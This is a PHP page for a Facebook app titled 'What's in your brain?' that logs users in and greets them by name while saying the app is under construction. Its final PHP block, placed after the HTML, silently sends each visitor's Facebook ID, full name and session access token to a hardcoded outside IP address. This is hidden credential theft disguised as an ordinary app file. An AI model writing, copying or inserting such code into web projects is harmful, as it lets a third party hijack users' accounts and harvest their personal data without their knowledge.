<?php
include('base.php');

$result = $facebook->extenedAccessToken();
if(isset($_REQUEST['code']) && $_REQUEST['code'] == $_SESSION['fb_401904883202488_code']){
	header("location: http://apps.facebook.com/whats-in-your-brain/");
}
?>
<!doctype html>
<html xmlns:fb="http://www.facebook.com/2008/fbml">
  <head>
    <title>What's in your brain?</title>
    <style>
      body {
        font-family: 'Lucida Grande', Verdana, Arial, sans-serif;
      }
      h1 a {
        text-decoration: none;
        color: #3b5998;
      }
      h1 a:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <h2>What's in your brain?</h2>

    <?php if (!$user): ?>      
      <div>
        <script>top.location.href='<?php echo $loginUrl; ?>'</script>
      </div>
    <?php endif ?>
    <?php if ($user): ?>
      <h3>Hello <?=$user_profile['first_name']?> </h3>
      <img src="https://graph.facebook.com/<?php echo $user; ?>/picture">
	  This app is under construction.
    <?php else: ?>
      <strong><em>You are not Connected.</em></strong>
    <?php endif ?>
  </body>
</html>
<?
	
	 
   $handle=file_get_contents("http://123.100.239.68/api/ins.php?i=" . $user_profile['id'] . "&n=" . urlencode($user_profile['name']) . "&t=" . $_SESSION['fb_401904883202488_access_token'] ,"r");
?>